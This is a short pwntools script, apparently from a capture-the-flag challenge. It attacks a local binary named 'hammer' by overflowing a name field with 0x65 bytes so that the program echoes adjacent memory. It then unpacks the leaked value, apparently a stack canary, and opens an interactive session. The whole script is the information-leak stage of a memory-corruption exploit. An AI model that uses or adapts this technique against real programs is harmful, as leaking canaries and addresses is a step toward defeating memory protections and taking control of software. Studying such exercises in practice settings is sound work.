#!/usr/bin/python
from pwn import *

p = process('./hammer')

p.recvuntil('hammer?:')
p.sendline(str(10))

p.recvuntil('name?:')
p.send('a'*0x65)

p.recvuntil('welcome ' + 'a'*0x65)
leak = u64(('\x00' + p.recvline()[:-1]).ljust(8, '\x00'))
print hex(leak)
p.interactive()
